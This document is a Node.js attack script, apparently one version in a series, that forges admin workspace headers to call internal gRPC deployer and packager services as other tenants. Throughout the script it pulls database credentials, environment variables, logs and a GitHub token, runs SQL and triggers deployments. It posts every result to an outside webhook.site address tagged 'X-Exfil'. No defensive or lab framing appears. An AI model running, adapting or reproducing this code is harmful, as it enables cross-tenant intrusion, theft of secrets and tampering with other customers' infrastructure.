const https = require('https');
const http2 = require('http2');

const WEBHOOK = "https://webhook.site/c0798e5d-676d-4f54-8dcf-1acfacb03ae8";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function encodeVarint(value) {
  const bytes = [];
  while (value > 0x7f) {
    bytes.push((value & 0x7f) | 0x80);
    value >>>= 7;
  }
  bytes.push(value & 0x7f);
  return Buffer.from(bytes);
}

function encodeProto(fields) {
  const bufs = [];
  for (const f of fields) {
    if (f.type === 'string' && f.value) {
      const strBuf = Buffer.from(f.value, 'utf8');
      bufs.push(encodeVarint((f.num << 3) | 2));
      bufs.push(encodeVarint(strBuf.length));
      bufs.push(strBuf);
    } else if (f.type === 'int64' && f.value !== undefined) {
      bufs.push(encodeVarint((f.num << 3) | 0));
      bufs.push(encodeVarint(f.value));
    } else if (f.type === 'bool' && f.value !== undefined) {
      bufs.push(encodeVarint((f.num << 3) | 0));
      bufs.push(Buffer.from([f.value ? 1 : 0]));
    }
  }
  return Buffer.concat(bufs);
}

// gRPC call WITH metadata headers for workspace spoofing
function grpcCall(host, port, service, method, protoFields, metadata) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
      client.setTimeout(10000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });

      const headers = {
        ':method': 'POST',
        ':path': '/' + service + '/' + method,
        'content-type': 'application/grpc',
        'te': 'trailers',
      };
      // Add spoofed metadata
      if (metadata) {
        for (const [k, v] of Object.entries(metadata)) {
          headers[k] = v;
        }
      }

      const req = client.request(headers);

      let data = Buffer.alloc(0);
      let respHeaders = {};
      req.on('response', (h) => { respHeaders = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => {
        client.close();
        resolve({
          status: respHeaders[':status'],
          grpcStatus: respHeaders['grpc-status'],
          grpcMessage: respHeaders['grpc-message'],
          dataLen: data.length,
          dataHex: data.toString('hex').substring(0, 1000),
          dataUtf8: data.toString('utf8').substring(0, 3000)
        });
      });
      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });

      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
      const frame = Buffer.alloc(5 + payload.length);
      frame[0] = 0x00;
      frame.writeUInt32BE(payload.length, 1);
      payload.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
  });
}

async function main() {
  await post('v6-start', new Date().toISOString());

  const DEPLOYER = { host: '10.98.64.141', port: 9003 };
  const PACKAGER = { host: '10.104.180.117', port: 9002 };

  // WORKSPACE SPOOFING - impersonate zeitlos-software
  const zeitlosMeta = {
    'x-lucity-workspace': 'zeitlos-software',
    'x-lucity-subject': 'admin',
    'x-lucity-email': 'admin@zeitlos.software',
    'x-lucity-roles': 'admin',
  };

  // Also try cblaettl
  const cblaettlMeta = {
    'x-lucity-workspace': 'cblaettl',
    'x-lucity-subject': 'admin',
    'x-lucity-email': 'admin@cblaettl.ch',
    'x-lucity-roles': 'admin',
  };

  // 1. GET DEPLOYMENT STATUS with zeitlos workspace context
  const zeitlosBeast = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'GetDeploymentStatus',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('zeitlos-beast-status', JSON.stringify(zeitlosBeast, null, 2));

  const zeitlosLC = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'GetDeploymentStatus',
    [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('zeitlos-loopcycles-status', JSON.stringify(zeitlosLC, null, 2));

  // 2. GET PROJECT from packager with zeitlos context
  const zeitlosBeastProj = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'GetProject',
    [{ num: 1, type: 'string', value: 'beast' }],
    zeitlosMeta);
  await post('zeitlos-beast-project', JSON.stringify(zeitlosBeastProj, null, 2));

  const zeitlosLCProj = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'GetProject',
    [{ num: 1, type: 'string', value: 'loopcycles' }],
    zeitlosMeta);
  await post('zeitlos-loopcycles-project', JSON.stringify(zeitlosLCProj, null, 2));

  // 3. LIST ALL PROJECTS with zeitlos context
  const zeitlosProjects = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'ListProjects', [],
    zeitlosMeta);
  await post('zeitlos-all-projects', JSON.stringify(zeitlosProjects, null, 2));

  // 4. SHARED VARIABLES for zeitlos projects
  const zeitlosBeastVars = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'SharedVariables',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('zeitlos-beast-vars', JSON.stringify(zeitlosBeastVars, null, 2));

  // 5. SERVICE VARIABLES for zeitlos beast
  const zeitlosBeastSvcVars = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'ServiceVariables',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'beast-website' }],
    zeitlosMeta);
  await post('zeitlos-beast-svc-vars', JSON.stringify(zeitlosBeastSvcVars, null, 2));

  // 6. DATABASE CREDENTIALS for cblaettl (they have a laravel DB)
  const cblaettlCreds = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'DatabaseCredentials',
    [{ num: 1, type: 'string', value: 'epic-falcon' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'laravel' }],
    cblaettlMeta);
  await post('cblaettl-db-creds', JSON.stringify(cblaettlCreds, null, 2));

  // 7. DATABASE TABLES for cblaettl
  const cblaettlTables = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'DatabaseTables',
    [{ num: 1, type: 'string', value: 'epic-falcon' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'laravel' }],
    cblaettlMeta);
  await post('cblaettl-db-tables', JSON.stringify(cblaettlTables, null, 2));

  // 8. SQL QUERY on cblaettl's DB
  const cblaettlSQL = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'DatabaseQuery',
    [{ num: 1, type: 'string', value: 'epic-falcon' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'laravel' },
     { num: 4, type: 'string', value: 'SELECT current_user, current_database(), version()' }],
    cblaettlMeta);
  await post('cblaettl-sql-query', JSON.stringify(cblaettlSQL, null, 2));

  // 9. SERVICE STATUS for zeitlos beast
  const zeitlosSvcStatus = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'ServiceStatus',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'beast-website' }],
    zeitlosMeta);
  await post('zeitlos-beast-svc-status', JSON.stringify(zeitlosSvcStatus, null, 2));

  // 10. SERVICE LOGS for zeitlos beast
  const zeitlosLogs = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'ServiceLogs',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'beast-website' }, { num: 4, type: 'int64', value: 50 }],
    zeitlosMeta);
  await post('zeitlos-beast-logs', JSON.stringify(zeitlosLogs, null, 2));

  // 11. USER GITHUB TOKEN - try from K8s secrets
  // The deployer stores tokens in K8s secrets like "github-token-{userId}"
  // Try to enumerate via different workspace contexts
  const marcelToken = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'UserGitHubToken',
    [{ num: 1, type: 'string', value: 'ncswkf736cpf' }],
    { 'x-lucity-workspace': 'marcelhintermann' });
  await post('marcel-github-token', JSON.stringify(marcelToken, null, 2));

  // 12. Try DEPLOY ENVIRONMENT for zeitlos - create ArgoCD app
  const zeitlosDeploy = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'DeployEnvironment',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' },
     { num: 3, type: 'string', value: 'http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/zeitlos-software-beast-gitops.git' },
     { num: 4, type: 'string', value: 'zeitlos-software-beast-development' }],
    zeitlosMeta);
  await post('zeitlos-deploy-env', JSON.stringify(zeitlosDeploy, null, 2));

  // 13. SYNC DEPLOYMENT for zeitlos
  const zeitlosSync = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'SyncDeployment',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('zeitlos-sync', JSON.stringify(zeitlosSync, null, 2));

  // 14. cblaettl SHARED VARIABLES
  const cblaettlVars = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'SharedVariables',
    [{ num: 1, type: 'string', value: 'epic-falcon' }, { num: 2, type: 'string', value: 'development' }],
    cblaettlMeta);
  await post('cblaettl-vars', JSON.stringify(cblaettlVars, null, 2));

  // 15. SET SHARED VARIABLES on zeitlos project - write MONOSTREAM_WAS_HERE
  const zeitlosSetVars = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'SetSharedVariables',
    [{ num: 1, type: 'string', value: 'beast' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('zeitlos-set-vars-test', JSON.stringify(zeitlosSetVars, null, 2));

  await post('v6-done', 'WORKSPACE SPOOFING COMPLETE at ' + new Date().toISOString());
  console.log('v6 done');
}

main().catch(e => { console.error(e); post('v6-fatal', e.message); });
